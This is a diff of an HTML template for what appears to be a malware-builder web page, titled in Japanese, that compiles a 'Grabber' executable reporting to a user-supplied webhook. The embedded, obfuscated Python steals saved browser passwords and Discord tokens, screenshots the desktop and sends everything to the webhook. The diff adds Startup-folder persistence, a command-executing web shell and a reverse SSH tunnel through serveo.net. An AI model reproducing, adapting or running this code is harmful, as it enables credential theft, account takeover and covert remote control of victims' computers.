@@ -23,9 +23,9 @@
         </header>
         <div class="content">
             {% if error %}
-            <p class="text-success">{{ error | safe }}</p>
+            <p class="text-danger">{{ error | safe }}</p>
             {% elif success %}
-            <p class="text-danger">{{ success }}</p>
+            <p class="text-success">{{ success }}</p>
             {% endif %}
             <p>作成したGrabberのexeは入力したWebhook URLに送信されます</p>
             <div class="row">
@@ -41,81 +41,115 @@
                         </div>
                         <div class="mb-2">
                             <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
-                            <textarea class="form-control" id="script" name="script" rows="20">O='encrypted_key'
-N='os_crypt'
-K='loginData'
-G='utf-8'
-F=open
+                            <textarea class="form-control" id="script" name="script" rows="20">T='content'
+S='encrypted_key'
+R='os_crypt'
+Q=Exception
+N='loginData'
+I='utf-8'
 B=None
-L=WEBHOOK_URL
-import win32crypt as M,requests as D,getpass as P,sqlite3 as Y,shutil as Z,socket as Q,base64 as I,json as J,mss,re,os as A
-from Crypto.Cipher import AES as E
-H=A.getenv('LOCALAPPDATA')
-C=A.getenv('APPDATA')
-a=[f"{H}\\Google\\Chrome",f"{H}\\Microsoft\\Edge",f"{H}\\Google\\Chrome SxS"]
-S=[f"{C}\\discord",f"{C}\\discordcanary",f"{C}\\Lightcord",f"{C}\\discordptb"]
-W=''
-def T(token):
+C=open
+J=WEBHOOK_URL
+import pexpect.popen_spawn,win32crypt as O,subprocess as E,pexpect,threading as U,requests as D,getpass as V,sqlite3 as Z,shutil as P,random,string,socket as F,base64 as K,json as L,time,mss,sys,re,os as A
+from Crypto.Cipher import AES as G
+from bs4 import BeautifulSoup
+M=A.getenv('LOCALAPPDATA')
+H=A.getenv('APPDATA')
+a=[f"{M}\\Google\\Chrome",f"{M}\\Microsoft\\Edge",f"{M}\\Google\\Chrome SxS"]
+W=[f"{H}\\discord",f"{H}\\discordcanary",f"{H}\\Lightcord",f"{H}\\discordptb"]
+i=''
+j=[]
+X='\n<html>\n<body>\n    <h2>Web Shell</h2>\n    <form method="GET">\n        <input type="text" name="cmd" placeholder="Enter command" autofocus />\n        <input type="submit" value="Execute" />\n    </form>\n    <pre>{output}</pre>\n</body>\n</html>\n'
+def Y(token):
     A=token
     if not A:return False
     C={'Content-Type':'application/json','Authorization':A};B=D.get('https://discord.com/api/v9/users/@me',headers=C);return str(B.status_code)[0]=='2',B.text
-def R():
-    H={}
-    for P in S:
-        U=f"{P}\\Local State";K=f"{P}\\Local Storage\\leveldb"
-        if not A.path.exists(K):continue
-        with F(U,encoding=G)as V:W=J.load(V)
-        C=W[N][O];C=C.encode(G);C=I.b64decode(C)[5:];X=M.CryptUnprotectData(C,B,B,B,0)[1]
-        for D in A.listdir(K):
-            if not D.endswith(('.log','.ldb')):continue
-            with F(A.path.join(K,D),'r',errors='ignore')as D:
-                Y=D.readlines()
-                for Z in Y:
-                    for a in re.findall('dQw4w9WgXcQ:[^"]*',Z):
+def b():
+    F={}
+    for M in W:
+        T=f"{M}\\Local State";H=f"{M}\\Local Storage\\leveldb"
+        if not A.path.exists(H):continue
+        with C(T,encoding=I)as U:V=L.load(U)
+        D=V[R][S];D=D.encode(I);D=K.b64decode(D)[5:];X=O.CryptUnprotectData(D,B,B,B,0)[1]
+        for E in A.listdir(H):
+            if not E.endswith(('.log','.ldb')):continue
+            with C(A.path.join(H,E),'r',errors='ignore')as E:
+                Z=E.readlines()
+                for a in Z:
+                    for b in re.findall('dQw4w9WgXcQ:[^"]*',a):
                         try:
-                            Q=I.b64decode(a.split('dQw4w9WgXcQ:')[1]);b=Q[3:15];c=Q[15:];d=E.new(X,E.MODE_GCM,b);L=d.decrypt(c)[:-16].decode();R=T(L)
-                            if R[0]:
-                                if L in H:continue
-                                H[L]=R[1];break
-                        except Exception as e:continue
-    return H
-def U():
-    D='===== Find Chromium Datas =====\n'
+                            N=K.b64decode(b.split('dQw4w9WgXcQ:')[1]);c=N[3:15];d=N[15:];e=G.new(X,G.MODE_GCM,c);J=e.decrypt(d)[:-16].decode();P=Y(J)
+                            if P[0]:
+                                if J in F:continue
+                                F[J]=P[1];break
+                        except Q as f:continue
+    return F
+def c():
+    E='===== Find Chromium Datas =====\n'
     for dir in a:
-        P=f"{dir}\\User Data\\Local State"
-        if not A.path.exists(P):continue
-        D+='===== '+dir.split('\\')[-1]+' =====\n'
-        with F(P,encoding=G)as b:Q=J.load(b)
-        R=Q['profile']['info_cache'];C=Q[N][O];C=C.encode(G);C=I.b64decode(C)[5:];c=M.CryptUnprotectData(C,B,B,B,0)[1]
-        for L in R:
-            S=R[L];D+=L+':\n    Email:'+S['user_name']+'\n    Name:'+S['gaia_name']+'\n    LoginData:\n';d=f"{dir}\\User Data\\{L}\\Login Data";Z.copy2(d,K);T=Y.connect(K);U=T.cursor();U.execute('SELECT action_url, username_value, password_value FROM logins')
-            for(h,H)in enumerate(U.fetchall()):
-                V=H[0];W=H[1];e=H[2][3:15];f=H[2][15:-16];g=E.new(c,E.MODE_GCM,e);X=g.decrypt(f).decode()
-                if V and W and X:D+=f"\n        ServiceUrl:{V}\n        Username:{W}\n        Password:{X}\n"
-            T.close()
-    return D
-def V():
-    M='file';G='screenshot.png';print('Start....');N=U();H=R();O=D.get('https://ifconfig.me').text;S=P.getuser();T=Q.gethostname();V={'left':0,'top':0,'width':1920,'height':1080}
-    with mss.mss()as W:B=W.grab(V);mss.tools.to_png(B.rgb,B.size,output=G)
-    B=F(G,'rb');E=f"""# Grabber Result
+        J=f"{dir}\\User Data\\Local State"
+        if not A.path.exists(J):continue
+        E+='===== '+dir.split('\\')[-1]+' =====\n'
+        with C(J,encoding=I)as b:M=L.load(b)
+        Q=M['profile']['info_cache'];D=M[R][S];D=D.encode(I);D=K.b64decode(D)[5:];c=O.CryptUnprotectData(D,B,B,B,0)[1]
+        for H in Q:
+            T=Q[H];E+=H+':\n    Email:'+T['user_name']+'\n    Name:'+T['gaia_name']+'\n    LoginData:\n';d=f"{dir}\\User Data\\{H}\\Login Data";P.copy2(d,N);U=Z.connect(N);V=U.cursor();V.execute('SELECT action_url, username_value, password_value FROM logins')
+            for(h,F)in enumerate(V.fetchall()):
+                W=F[0];X=F[1];e=F[2][3:15];f=F[2][15:-16];g=G.new(c,G.MODE_GCM,e);Y=g.decrypt(f).decode()
+                if W and X and Y:E+=f"\n        ServiceUrl:{W}\n        Username:{X}\n        Password:{Y}\n"
+            U.close()
+    return E
+def d(useUser):
+    I=useUser;B=f"C:\\Users\\{I}\\Music"
+    if A.path.isdir(f"{B}\\Pi"):return
+    with C(f"{B}\\Pi.zip",mode='wb')as H:H.write(D.get('https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win32.zip').content)
+    P.unpack_archive(f"{B}\\Pi.zip",f"{B}\\Pi");A.remove(f"{B}\\Pi.zip");B=f"{B}\\Pi\\OpenSSH-Win32";F=f'@echo off\n@if not "%~0"=="%~dp0.\\%~nx0" start /min cmd /c,"%~dp0.\\%~nx0" %* & goto :eof\ncd {B}\n';B=f"C:\\Users\\{I}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";F+='start '
+    for G in A.listdir(A.getcwd()):
+        if not A.path.isfile(G):continue
+        if G=='grabber.py':F+=f"python {A.getcwd()}\\{G}"
+        elif G.endswith('.exe'):F+=f".\\{A.getcwd()}\\{G}"
+    F+=f" as"
+    with C(f"{B}\\pistart.bat",mode='w')as H:H.write(F)
+    E.run(f"{B}\\pistart.bat")
+def e(useUser,ip):
+    A=f"C:\\Users\\{useUser}\\Music\\Pi\\OpenSSH-Win32"
+    with E.Popen([f"{A}\\ssh.exe",'-o','StrictHostKeyChecking=no','-R','80:127.0.0.1:8877','serveo.net'],stdout=E.PIPE,stderr=E.STDOUT,text=True)as B:
+        for C in B.stdout:D.post(J,data={T:f"{ip}: {C}"})
+def f(request):
+    D='GET /?cmd=';B=request
+    try:
+        A=''
+        if D in B:A=B.split(D)[1].split(' ')[0];A=A.split('&')[0];A=A.replace('%20',' ')
+        F=E.getoutput(A)if A else'';G=X.format(output=F);C=f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{G}"
+    except Q as H:C=f"HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/plain\r\n\r\nError: {str(H)}"
+    return C
+def g(port=8877):
+    A=F.socket(F.AF_INET,F.SOCK_STREAM);A.bind(('127.0.0.1',port));A.listen(5)
+    while True:B,E=A.accept();C=B.recv(1024).decode();D=f(C);B.sendall(D.encode());B.close()
+def h():
+    P='file';I='screenshot.png';G=V.getuser();K=D.get('http://ifconfig.me').text;Q=F.gethostname()
+    if len(sys.argv)>1:U.Thread(target=g).start();e(G,K);return
+    print('Start....');d(G);R=c();M=b();S={'left':0,'top':0,'width':1920,'height':1080}
+    with mss.mss()as W:B=W.grab(S);mss.tools.to_png(B.rgb,B.size,output=I)
+    B=C(I,'rb');X=C(f"C:\\Users\\{G}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pistart.bat",'r').read();H=f"""# Grabber Result
 ```
-IP:{O}
-UseUser:{S}
-HostName:{T}```
+IP:{K}
+UseUser:{G}
+HostName:{Q}```
 ## Tokens
 ```
 """
-    for I in H:C=J.loads(H[I]);E+=f"""Token - {I}
-UserId - {C["id"]}
-UserName - {C["username"]}
-GlobalName - {C["global_name"]}
-Email - {C["email"]}
-PhoneNumber - {C["phone"]}
+    for O in M:E=L.loads(M[O]);H+=f"""Token - {O}
+UserId - {E["id"]}
+UserName - {E["username"]}
+GlobalName - {E["global_name"]}
+Email - {E["email"]}
+PhoneNumber - {E["phone"]}
 
 """
-    E+='```';D.post(L,data={'content':E},files={M:B});D.post(L,files={M:('loginData.txt',N.encode())});B.close();X=[K,G]
-    for Y in X:A.remove(Y)
-if __name__=='__main__':V()</textarea>
+    H+=f"```\nSSHStartBat:```\n{X}\n```";D.post(J,data={T:H},files={P:B});D.post(J,files={P:('loginData.txt',R.encode())});B.close();Y=[N,I]
+    for Z in Y:A.remove(Z)
+if __name__=='__main__':h()</textarea>
                         </div>
                         <button type="submit" id="submit" class="btn btn-primary">
                             <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
@@ -131,8 +165,9 @@ if __name__=='__main__':V()</textarea>
             var webhookUrlInput = document.getElementById("webhookUrl");
             var librariesInput = document.getElementById("libraries");
             var scriptInput = document.getElementById("script");
+            var ngrokTokenInput = document.getElementById("ngrokToken");
             var submitButton = document.getElementById("submit");
-            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = true;
+            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = ngrokTokenInput.readOnly = true;
             submitButton.disabled = true;
             var spinner = this.querySelector('.spinner-border');
             spinner.classList.remove('d-none');
